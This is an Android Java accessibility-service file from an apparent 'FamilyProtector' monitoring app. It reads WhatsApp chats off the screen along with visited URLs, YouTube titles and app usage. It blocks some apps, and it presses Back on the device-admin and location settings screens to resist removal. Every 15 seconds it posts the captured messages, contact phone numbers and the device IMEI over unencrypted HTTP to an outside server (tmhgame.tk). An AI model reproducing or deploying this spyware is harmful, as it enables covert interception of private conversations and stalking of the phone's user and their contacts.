package com.family.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;

import com.family.familyprotector.ContactHelper;
import com.family.familyprotector.Conversation;
import com.family.familyprotector.Device;
import com.family.familyprotector.FileR;
import com.family.familyprotector.Logger;
import com.family.familyprotector.Message;
import com.family.internet.ServerHelper2;
import com.family.util.DoublyLinkedList;
import com.family.util.StringUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;


public class MyAccessibilityService extends AccessibilityService {


    //read screen text;
    //https://stackoverflow.com/questions/30909926/get-text-content-of-the-android-screen



    //solution
    //https://stackoverflow.com/questions/40503081/onaccessibilityevent-not-called-at-all

       /*
    Youtube baxilan vidyo
    The First Love (ilk aşk - Azerbaijan tar) Ramiz Guliyev -- android.widget.TextView
2020-04-01 09:17:08.498 8370-8370/com.family.familyprotector D/INFOOO: 611K baxış -- android.widget.TextView
2020-04-01 09:17:08.499 8370-8370/com.family.familyprotector D/INFOOO: Paylaşın -- android.widget.TextView
2020-04-01 09:17:08.499 8370-8370/com.family.familyprotector D/INFOOO: Burada saxlayın: -- android.widget.TextView
2020-04-01 09:17:08.499 8370-8370/com.family.familyprotector D/INFOOO: Abe -- android.widget.TextView
2020-04-01 09:17:08.499 8370-8370/com.family.familyprotector D/INFOOO: 828 abunəçi -- android.widget.TextView
2020-04-01 09:17:08.499 8370-8370/com.family.familyprotector D/INFOOO: ABUNƏ OL -- android.widget.TextView
Youtube search link
https://www.youtube.com/results?search_query=the+show+must+go+on
     */



    public static MyAccessibilityService instance;
    public static Set<String> blockedApps;
    public static boolean writeBlockedApp = true;
    public static String lastConversation;
    public static ArrayList<AccessibilityNodeInfo> parentsW = new ArrayList<>();


    //every day havo to reneuw
    public static ArrayList< Ac > activities;
    public static ArrayList<YAc> yactivities = new ArrayList<>();
    public static ArrayList<WAc> webSites = new ArrayList<>();
    public static String oldEntry = null;
    public static Map<String, Conversation> conversationMap = new HashMap<>();
    public static Conversation simpleConversation = new Conversation();

    public class Ac {
        public String pa;
        public long start;
        public long end;
    }
    public class YAc {
        public String name = "";
        public long time = 0;
    }
    public class WAc {
        public String url = "";
        public long time = 0;
    }

    ArrayList<AccessibilityNodeInfo> textViewNodes;
    private void findChildViews(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }
        int childCount = parentView.getChildCount();
        //Log.d("sagol", parentView.getClassName().toString());
        //TextView
        //EditText
        if(parentView.getClassName().toString().contentEquals("android.widget.EditText")) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            //Logger.l("INFOO", isWebsite(ans) + "-" + ans);
            if(isWebsite(ans)) {
                if(webSites.size() == 0 || !webSites.get(webSites.size()-1).url.equals(ans)) {
                    Logger.l("INFOOO", ans);
                    WAc w = new WAc();
                    w.time = System.currentTimeMillis();
                    w.url = ans;
                    webSites.add(w);
                }
            }
        }
        if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            textViewNodes.add(parentView);
        } else {
            for (int i = 0; i < childCount; i++) {
                findChildViews(parentView.getChild(i));
            }


        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    public void whatsappFilter(AccessibilityNodeInfo ni) {
        List<AccessibilityNodeInfo> L = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
        for(AccessibilityNodeInfo x : L) {
            CharSequence c = x.getText();
            if(c == null){
                continue;
            }
            lastConversation = x.getText().toString();
            break;
            //Logger.l("WHATSAPPP", );

        }

        List<AccessibilityNodeInfo> entry = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
        if(entry.size() != 0) {
            Logger.l("---------------" + getTextViewText(entry.get(0)));
        }

        Logger.l("BEGIN=============");
        Set<Integer> simpleSet = new HashSet<>();
        parentsW = new ArrayList<>();
        for(int i = 0; i < textViewNodes.size(); i++) {


            AccessibilityNodeInfo ti = textViewNodes.get(i);
            AccessibilityNodeInfo p = ti.getParent();
            // whatsapi chavlandiranda 2 dene text dalbadal gelir. sonra vaxt;
            //whatsapda yuxarida vaxt informasiyasi olanda parent yazanda 3 mende 4
            AccessibilityNodeInfo pp = p.getParent();
            //if(pp == null) continue;
            int phc = p.hashCode();
            if(!simpleSet.contains(phc)) {
                parentsW.add(p);
                simpleSet.add(phc);
            }
        }
        Logger.l("Size" + parentsW.size());
        if(parentsW.size() > 0 && parentsW.get(0).getChildCount() == 1) {
            lastConversation = getTextViewText(parentsW.get(0).getChild(0));
        }
        Conversation cc = conversationMap.get(lastConversation);
        if(cc == null) {
            cc = new Conversation();
            conversationMap.put(lastConversation, cc);
        }
        ArrayList<Message> messages = new ArrayList<>();
        int index = -1;
        for(AccessibilityNodeInfo x : parentsW) {
            index++;
            Logger.l("B=======");
            int c = x.getChildCount();
            Message m = new Message();
            Logger.l("SIZE = " + c);
            if(c == 1) {
                //lastConversation = getTextViewText(x.getChild(0));
            }


            if(c > 0 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0)))) {
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
            }
            if(c == 3 && StringUtil.isTime(getTextViewText(x.getChild(1))) &&
                    x.getChild(2) != null && x.getChild(2).getClassName().toString().endsWith("ImageView")) {
                //vaxti ozun tap
                m.sender = "Men";
                m.content = getTextViewText(x.getChild(0));
                m.unclear = getTextViewText(x.getChild(1));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null) {
                    // bu silinmelidi cunki messagelerin date lerini hamsi nulldu mapdan getirmek lazimdi
                    m.date = (Date) messages.get(messages.size()-1).date.clone();
                    StringUtil.setDateTime(m.date, m.unclear);
                }
            }else if(c == 2 && StringUtil.isTime(getTextViewText(x.getChild(1)))) {
                //vacxti ozun tap
                m.sender = lastConversation;
                m.content = getTextViewText(x.getChild(0));
                m.unclear = getTextViewText(x.getChild(1));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null) {
                    m.date = (Date) messages.get(messages.size()-1).date.clone();
                    StringUtil.setDateTime(m.date, m.saat);
                }
            }else if(c == 3 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0))) && StringUtil.isTime(getTextViewText(x.getChild(2)))) {
                m.sender = lastConversation;
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
                StringUtil.setDateTime(m.date, getTextViewText(x.getChild(2)));
                m.content = getTextViewText(x.getChild(1));
                m.saat = getTextViewText(x.getChild(2));

            }else if(c == 4 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0))) && StringUtil.isTime(getTextViewText(x.getChild(2))) &&
                    x.getChild(x.getChildCount()-1).getClassName().toString().endsWith("ImageView")) {
                m.sender = "Men";
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
                StringUtil.setDateTime(m.date, getTextViewText(x.getChild(2)));
                m.content = getTextViewText(x.getChild(1));
                m.saat = getTextViewText(x.getChild(2));
            }else if(c == 12|| c == 13) {// time yuxarida cixib apply ele evvelden meluma qeder
                String t = getTextViewText(x.getChild(6));
                for(Message me : messages) {
                    if(me.date == null) {

                        me.date = StringUtil.getDate(t);
                        if(me.unclear == null){
                            continue;
                        }
                        StringUtil.setDateTime(me.date, me.unclear);
                        me.saat = me.unclear;
                        me.unclear = null;
                    }else {
                        break;
                    }
                }
            }else {
                String time = StringUtil.findTime(x);

                Logger.l("-------------------------------------------------------------"+time + m.date);
                if(time != null) {
                    m.sender = "whatsapp::";
                    m.content = "----";
                    m.saat = time;
                    m.unclear = time;
                    if(m.date == null) {
                        if(messages.size() != 0 && messages.get(messages.size()-1).date != null) {
                            m.date = (Date) messages.get(messages.size()-1).date.clone();
                            StringUtil.setDateTime(m.date, time);
                        }
                    }else {
                        StringUtil.setDateTime(m.date, time);
                    }

                }else if(c != 0 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0)))) {
                    //burda problem var
                    m.sender = "whatsapp::";
                    m.content = "----";
                    m.saat = "00:00";
                    m.unclear = "00:00";
                }
            }
            if(messages.size() == 0 && m.saat != null && cc.M.get(m.toUnique()) != null) {
                m.date = (Date) cc.M.get(m.toUnique()).clone();
                StringUtil.setDateTime(m.date, m.saat);
            }
//                    if(m.sender == null) {
//                        continue;
//                    }
            if(m.sender!= null)
                messages.add(m);
            for(int i = 0; i < c; i++) {
                AccessibilityNodeInfo child = x.getChild(i);
                if(child == null) continue;
                Logger.l(child.getClassName().toString() + " - " + getTextViewText(child));
            }
            Logger.l("E=======");
        }
        Logger.l("bb---");
        ArrayList<Message> al = new ArrayList<>();
        for(Message x : messages) {
            Logger.l("TOGHRUL", x.toString());
            if(x.sender != null)
                al.add(x);

        }

        cc.addAll(al);
        Logger.l("SIZE = " + cc.messages.size);
        cc.messages.iterateForward();
        Logger.l("ee---");
        Logger.l("END=============");
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        AccessibilityNodeInfo ni = accessibilityEvent.getSource();
        if(ni == null || ni.getPackageName() == null)return;

        //com.whatsapp:id/conversation_contact_name
        //com.whatsapp:id/entry
        //AccessibilityEvent.ob
       //Log.i("INFO", "---"+eventType + "--" + ni);
        if(ni.getText() != null) {
            //Logger.l("INFO", ni.getText().toString() + " " + ni.getClassName().toString());
        }
        //scrool button
//        List<AccessibilityNodeInfo> Li = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/scroll_bottom");
//        Logger.l("SC", Li.size() + "");








        switch (eventType) {

            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:

                //AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                //AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                //findChildViews(rootNode);
                //rootNode.findAccessibilityNodeInfosByViewId()
                if(rootNode == null)return;
                String pname = rootNode.getPackageName() == null ? "" : rootNode.getPackageName().toString();
                if(activities.size() == 0) {
                    Ac ac = new Ac();
                    ac.start = System.currentTimeMillis();
                    ac.pa = pname;
                    ac.end = -1;
                    activities.add(ac);
                }else if(!activities.get(activities.size()-1).pa.equals(pname)) {
                    activities.get(activities.size()-1).end = System.currentTimeMillis();
                    Ac ac = new Ac();
                    ac.start = System.currentTimeMillis();
                    ac.pa = pname;
                    ac.end = -1;
                    activities.add(ac);
                    for(Ac x : activities) {
                        //Logger.l(x.pa + "- " + (x.end-x.start));
                    }
                }
                if(rootNode == null)return;
                if(blockedApps == null) {
                    buildBlockedApps();
                }

                if(blockedApps.contains(rootNode.getPackageName().toString())) {
                    sondur();
                }

                textViewNodes = new ArrayList<AccessibilityNodeInfo>();

                //AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                findChildViews(rootNode);

                //findInputChild(rootNode);
                // youtube
                for(int i = 1; i < textViewNodes.size(); i++) {
                    String ans = getTextViewText(textViewNodes.get(i));
                    boolean p = ans.endsWith("views");

                    String[] pp = ans.split(" ");
                    //Logger.l("BAXIS", pp.length + " " +  ans);
                    p = p && (pp.length == 2);


                    if(p) {
                        String b = getTextViewText(textViewNodes.get(i-1));
                        //b = new StringUtil().getCharacters(b);
                        if(yactivities.size() == 0 || !yactivities.get(yactivities.size()-1).name.equals(b)) {
                            YAc ya = new YAc();
                            ya.name = b;
                            ya.time = System.currentTimeMillis();
                            yactivities.add(ya);
                            Logger.l("BAXIS", b + "   " + ya.time);
                        }

                        break;
                    }
                }
                //Blocking Apps
                String oldText = "";
                for(int i = 0; i < textViewNodes.size(); i++) {
                    AccessibilityNodeInfo mNode = textViewNodes.get(i);
                    if(mNode.getText()==null){
                        return;
                    }
                    String tv1Text = mNode.getText().toString();
                    if((tv1Text.startsWith("TThis admin app is active") && oldText.equals("FamilyProtector")) || tv1Text.equals("Locationn")) {

                        performGlobalAction(GLOBAL_ACTION_BACK);
                        //Intent dialogIntent = new Intent(this, MainActivity.class);
                        //dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        //startActivity(dialogIntent);
                    }
                    oldText = tv1Text;

                }

                if(ni.getPackageName() != null && ni.getPackageName().toString().equals("com.whatsapp")) {
                    //Logger.l(ni.getPackageName().toString());
                    whatsappFilter(ni);
                }




                break;

        }
    }


    private void findInputChild(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }

        int childCount = parentView.getChildCount();
        //Log.d("sagol", parentView.getClassName().toString());
        //TextView
        //EditText
        if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.EditText"))) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            Logger.l("INFO", ans);
            textViewNodes.add(parentView);
        } else {
            for (int i = 0; i < childCount; i++) {
                findChildViews(parentView.getChild(i));
            }


        }
    }


    public String getTextViewText(AccessibilityNodeInfo t) {
        if(t == null) return "unknow";
        return t.getText() != null ? t.getText().toString() : "unknow";
    }
    @Override
    public void onInterrupt() {

    }

    public boolean isWebsite(String s) {
        if(s.contains(".com/") || s.contains(".de/") || s.contains(".az/") || s.contains(".ru/") || s.contains(".tr/")|| s.contains(".org/")) {
            return true;
        }else return false;
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        //important
        simpleConversation.messages.clear();
        int action = event.getAction();
        int keyCode = event.getKeyCode();
        Log.d("salam", "KEYEVENT");
        if(action == KeyEvent.KEYCODE_POWER) {
            Log.d("power", "poewer basildi");
        }
        if (action == KeyEvent.ACTION_UP) {
            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
                Log.d("salam", "KeyUp");
            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
                Log.d("salam", "KeyDown");
            }
            return true;
        } else {
            return super.onKeyEvent(event);
        }

    }



    public void buildBlockedApps() {
        blockedApps = new HashSet<String>();
        String ans = "";
        try {
            ans = new FileR().read("blockedapps.txt");
            String[] ar = ans.split("\\|");
            for(int i = 0; i < ar.length; i++) {
                blockedApps.add(ar[i]);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void writeBlockedApps() {
        if(blockedApps.size() == 0)return;
        if(writeBlockedApp) {

            StringBuilder sb = new StringBuilder("");
            List<String>L = new ArrayList<>(blockedApps);
            sb.append(L.get(0));
            for(int i = 1; i < L.size(); i++) {
                sb.append("|"+L.get(i));
            }
            try {
                new FileR().write("blockedapps.txt", sb.toString(), false);
                //writeBlockedApp = false;
                Logger.l(sb.toString() + " Yazildi uzerine");
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        activities = new ArrayList<>();
        buildBlockedApps();

        final Handler h = new Handler();
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                h.post(new Runnable() {
                    @Override
                    public void run() {
                        writeBlockedApps();
                    }
                });
            }
        }, 0, 1000*60 * 10);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                h.post(new Runnable() {
                    @Override
                    public void run() {
                        JSONObject d = new JSONObject();
                        JSONArray ar = new JSONArray();
                        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
                            String k = m.getKey();
                            Conversation c = m.getValue();
                            JSONArray ma = new JSONArray();
                            JSONObject jo = new JSONObject();
                            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
                                Message message = (Message) x.element;
                                JSONObject o = new JSONObject();
                                try {
                                    o.put("sender", message.sender);
                                    o.put("content", message.content);
                                    o.put("time", message.date.getTime());
                                    ma.put(o);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            try {
                                jo.put("sender", k);
                                jo.put("number", new ContactHelper(instance).getPhoneNumber(instance, k));
                                jo.put("con", ma);
                                ar.put(jo);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                        }
                        try {
                            d.put("data", ar);
                            d.put("imei", new Device(instance).getImei());
                            Logger.l("POSTED data : " + d.toString());
                            new ServerHelper2(instance).execute("http://tmhgame.tk/sendWhatsapp", d.toString());

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        }, 0, 1000*15);
    }

    public void sondur() {
        performGlobalAction(GLOBAL_ACTION_HOME);
    }

    //IMPORTANT
    //AccessibilityNodeInfo interactedNodeInfo =
    //                accessibilityEvent.getSource();

}
